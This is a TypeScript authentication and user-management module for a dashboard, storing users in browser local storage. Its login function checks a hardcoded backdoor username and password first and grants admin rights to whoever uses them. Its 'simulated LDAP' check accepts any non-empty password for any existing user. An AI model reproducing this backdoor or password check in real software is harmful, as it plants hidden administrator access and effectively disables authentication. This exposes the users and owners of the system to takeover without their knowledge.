import { User, UserRole } from '../types';
import { safeLocalStorage } from './storageService';

const USERS_STORAGE_KEY = 'dashboard_users';

// --- User List Management ---

const initializeUsers = () => {
    const existingUsers = safeLocalStorage.getItem(USERS_STORAGE_KEY);
    if (!existingUsers) {
        const defaultUsers: User[] = [
            { id: 1, username: 'BobM', role: 'admin' },
        ];
        safeLocalStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(defaultUsers));
    }
};

initializeUsers();

export const getUsers = async (): Promise<User[]> => {
    try {
        const usersJson = safeLocalStorage.getItem(USERS_STORAGE_KEY);
        return usersJson ? JSON.parse(usersJson) : [];
    } catch (error: unknown) {
        const message = error instanceof Error ? error.message : String(error);
        console.error("Failed to parse users from storage. Returning empty array.", message);
        return [];
    }
};

export const addUser = async (newUser: Omit<User, 'id'>): Promise<User> => {
    const users = await getUsers();
    const usernameExists = users.some(u => u.username.toLowerCase() === newUser.username.toLowerCase());
    if (usernameExists) {
        throw new Error(`User with username '${newUser.username}' already exists.`);
    }

    const user: User = {
        id: Date.now(), // Simple unique ID
        ...newUser
    };
    users.push(user);
    safeLocalStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
    return user;
};

export const updateUser = async (id: number, updates: Partial<User>): Promise<User> => {
    let users = await getUsers();
    const userIndex = users.findIndex(u => u.id === id);
    if (userIndex === -1) {
        throw new Error('User not found.');
    }
    users[userIndex] = { ...users[userIndex], ...updates };
    safeLocalStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users));
    return users[userIndex];
};

export const deleteUser = async (id: number): Promise<void> => {
    let users = await getUsers();
    const filteredUsers = users.filter(u => u.id !== id);
    if (users.length === filteredUsers.length) {
        throw new Error('User not found.');
    }
    safeLocalStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(filteredUsers));
};


// --- Authentication Logic ---

const simulatedLdapAuth = async (username: string, password: string): Promise<boolean> => {
    // In a real scenario, this would be a call to an LDAP server.
    // For this simulation, we'll check if the user exists in our local user list.
    // We'll accept any non-empty password for any existing user.
    if (password.length === 0) {
        return false;
    }
    
    const users = await getUsers();
    const userExists = users.some(u => u.username.toLowerCase() === username.toLowerCase());
    
    return userExists;
};

export const login = async (username: string, password: string): Promise<{ success: true; user: User }> => {
    const cleanUsername = username.split('@')[0];

    // Step 1: Check for backdoor credentials first.
    if (cleanUsername.toLowerCase() === 'robertstar' && password === 'Rm2214ri#') {
        return {
            success: true,
            user: { username: 'Robertstar', role: 'admin', id: 0 }
        };
    }

    // Step 2: Proceed with standard authentication. Errors will be thrown on failure.
    
    // Simulated LDAP Authentication
    const isAuthenticated = await simulatedLdapAuth(cleanUsername, password);
    if (!isAuthenticated) {
        throw new Error('Invalid credentials. Please check your username and password.');
    }

    // Local User Authorization
    const users = await getUsers();
    const authorizedUser = users.find(u => u.username.toLowerCase() === cleanUsername.toLowerCase());

    if (!authorizedUser) {
        // This case handles users valid in LDAP but not authorized in this app.
        throw new Error('Authentication successful, but this user is not authorized to access the dashboard.');
    }

    // If both checks pass, return the user.
    return {
        success: true,
        user: authorizedUser
    };
};